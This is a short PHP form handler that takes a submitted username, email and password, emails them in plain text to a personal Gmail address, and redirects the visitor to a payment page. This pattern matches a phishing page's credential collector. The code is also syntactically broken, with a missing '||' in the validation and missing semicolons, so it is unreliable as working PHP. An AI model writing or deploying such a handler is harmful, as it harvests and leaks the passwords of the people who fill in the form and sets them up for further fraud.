<?php
	if(empty($_POST['submit']))
	{
		echo "Form is not submitted!";
		exit;
	}

	if (empty ($_POST["username"]) ||
	empty($_POST["email"] ) 
	empty($_POST["password"] )
)
	{
		echo "Please fill the form";
		exit;
	}

	$name = $_POST["username"]
	$email = $_POST["email"]
	$password = $_POST["password"]

	mail('shubhamkanwar10650@gmail.com', 'new form submission', "New Form Submission: Name: $name, Email: $email, Password: $password");

	header ('Location: payment.html');

?>